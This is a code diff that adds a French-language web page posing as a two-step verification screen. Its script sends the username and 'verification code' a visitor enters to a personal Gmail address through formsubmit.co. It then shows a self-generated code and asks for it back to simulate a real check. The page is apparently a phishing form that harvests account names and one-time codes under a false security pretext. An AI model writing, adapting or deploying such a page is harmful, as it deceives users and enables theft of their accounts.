@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vérification en deux étapes</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .container {
+      background: white;
+      padding: 40px;
+      border-radius: 20px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      max-width: 450px;
+      width: 100%;
+    }
+
+    h1 {
+      color: #333;
+      margin-bottom: 10px;
+      font-size: 28px;
+      text-align: center;
+    }
+
+    .subtitle {
+      color: #666;
+      margin-bottom: 30px;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      color: #555;
+      font-weight: 600;
+      font-size: 14px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px 15px;
+      border: 2px solid #e0e0e0;
+      border-radius: 10px;
+      font-size: 16px;
+      transition: all 0.3s;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #667eea;
+      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+    }
+
+    button:active {
+      transform: translateY(0);
+    }
+
+    #status {
+      margin-top: 20px;
+      padding: 12px;
+      border-radius: 10px;
+      text-align: center;
+      font-weight: 600;
+      display: none;
+    }
+
+    #status.success {
+      background: #d4edda;
+      color: #155724;
+      display: block;
+    }
+
+    #status.error {
+      background: #f8d7da;
+      color: #721c24;
+      display: block;
+    }
+
+    #status.info {
+      background: #d1ecf1;
+      color: #0c5460;
+      display: block;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .step-indicator {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #667eea;
+      font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Étape 1 -->
+    <div id="step1">
+      <div class="step-indicator">Étape 1/2</div>
+      <h1>🔐 Vérification</h1>
+      <p class="subtitle">Entrez vos informations pour commencer</p>
+      
+      <form id="contactForm">
+        <div class="form-group">
+          <label for="pseudo">Pseudo</label>
+          <input type="text" id="pseudo" name="pseudo" required placeholder="Votre pseudo">
+        </div>
+        
+        <div class="form-group">
+          <label for="code1">Code de vérification</label>
+          <input type="number" id="code1" name="code1" required placeholder="Entrez un chiffre">
+        </div>
+        
+        <button type="submit">Envoyer ➜</button>
+      </form>
+      
+      <div id="status"></div>
+    </div>
+
+    <!-- Étape 2 -->
+    <div id="step2" class="hidden">
+      <div class="step-indicator">Étape 2/2</div>
+      <h1>✅ Confirmation</h1>
+      <p class="subtitle">Entrez le code de confirmation</p>
+      
+      <form id="confirmForm">
+        <div class="form-group">
+          <label for="code2">Code de confirmation</label>
+          <input type="number" id="code2" name="code2" required placeholder="Entrez le code affiché">
+        </div>
+        
+        <div id="generatedCode" style="background: #f0f0f0; padding: 15px; border-radius: 10px; text-align: center; margin-bottom: 20px; font-size: 24px; font-weight: bold; color: #667eea;"></div>
+        
+        <button type="submit">Valider ➜</button>
+      </form>
+      
+      <div id="status2"></div>
+    </div>
+  </div>
+
+  <script>
+    let userPseudo = '';
+    let userCode1 = '';
+    let generatedCode = '';
+
+    // Étape 1 : Premier formulaire
+    document.getElementById("contactForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      userPseudo = document.getElementById("pseudo").value;
+      userCode1 = document.getElementById("code1").value;
+
+      const formData = new FormData();
+      formData.append("pseudo", userPseudo);
+      formData.append("code1", userCode1);
+      formData.append("etape", "1");
+
+      const statusDiv = document.getElementById("status");
+      statusDiv.className = "info";
+      statusDiv.innerText = "Envoi en cours...";
+
+      fetch("https://formsubmit.co/ajax/tss.alex84@gmail.com", {
+        method: "POST",
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        statusDiv.className = "success";
+        statusDiv.innerText = "Message envoyé avec succès ✅";
+        
+        // Générer un code aléatoire pour l'étape 2
+        generatedCode = Math.floor(1000 + Math.random() * 9000).toString();
+        
+        // Passer à l'étape 2 après un délai
+        setTimeout(() => {
+          document.getElementById("step1").classList.add("hidden");
+          document.getElementById("step2").classList.remove("hidden");
+          document.getElementById("generatedCode").innerText = "Votre code : " + generatedCode;
+        }, 1500);
+      })
+      .catch(error => {
+        statusDiv.className = "error";
+        statusDiv.innerText = "Erreur lors de l'envoi ❌";
+      });
+    });
+
+    // Étape 2 : Deuxième formulaire
+    document.getElementById("confirmForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const userCode2 = document.getElementById("code2").value;
+
+      const formData = new FormData();
+      formData.append("pseudo", userPseudo);
+      formData.append("code1", userCode1);
+      formData.append("code_genere", generatedCode);
+      formData.append("code_saisi", userCode2);
+      formData.append("etape", "2");
+
+      const statusDiv = document.getElementById("status2");
+      statusDiv.className = "info";
+      statusDiv.innerText = "Envoi en cours...";
+
+      fetch("https://formsubmit.co/ajax/tss.alex84@gmail.com", {
+        method: "POST",
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        statusDiv.className = "success";
+        statusDiv.innerText = "Validation réussie ✅";
+        
+        // Redirection après validation (tu peux changer l'URL)
+        setTimeout(() => {
+          // Remplace cette URL par ta page de destination
+          window.location.href = "https://example.com/success";
+          // Ou affiche un message : alert("Validation complète !");
+        }, 2000);
+      })
+      .catch(error => {
+        statusDiv.className = "error";
+        statusDiv.innerText = "Erreur lors de la validation ❌";
+      });
+    });
+  </script>
+</body>
+</html>
